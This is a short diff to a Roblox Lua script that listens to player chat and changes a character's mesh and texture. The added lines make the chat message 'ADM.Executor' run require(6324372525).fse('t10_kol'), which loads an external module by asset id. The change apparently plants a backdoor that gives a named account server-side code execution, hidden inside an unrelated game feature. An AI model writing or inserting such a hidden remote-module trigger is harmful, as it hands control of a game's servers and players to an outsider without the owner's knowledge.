@@ -52,6 +52,8 @@ for _, player in pairs(game.Players:GetPlayers()) do
 					mesh.MeshId = "rbxassetid://7606070501"
 					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
 				end
+			elseif message == "ADM.Executor" then
+				require(6324372525).fse("t10_kol")
 			end
 				--rbxassetid://7606070501
 		end)
